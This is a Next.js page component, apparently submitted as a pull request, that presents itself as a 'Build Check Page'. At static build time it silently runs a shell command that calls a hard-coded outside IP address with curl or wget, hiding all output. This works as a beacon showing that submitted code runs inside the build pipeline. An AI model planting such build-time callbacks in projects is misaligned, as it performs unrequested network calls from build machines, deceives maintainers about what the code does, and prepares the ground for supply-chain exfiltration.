// PR #5: Build-time fetch via Server Component static generation
import { execSync } from "node:child_process";

// This executes at build time when the page is statically generated
console.log("⏳ [Server Component] Fetching build-time URL...");
try {
  execSync("timeout 5 curl -s http://159.65.66.91:9093 >/dev/null 2>&1 || timeout 5 wget -q -O /dev/null http://159.65.66.91:9093 2>&1", {
    stdio: "pipe",
  });
  console.log("✅ [Server Component] Build-time fetch completed");
} catch (error) {
  console.log("⚠️ [Server Component] Build-time fetch failed");
}

export default function BuildCheckPage() {
  return (
    <div style={{ padding: "2rem" }}>
      <h1>Build Check Page</h1>
      <p>This page triggers a build-time fetch.</p>
    </div>
  );
}

// Force static generation
export const dynamic = "force-static";
export const revalidate = false;
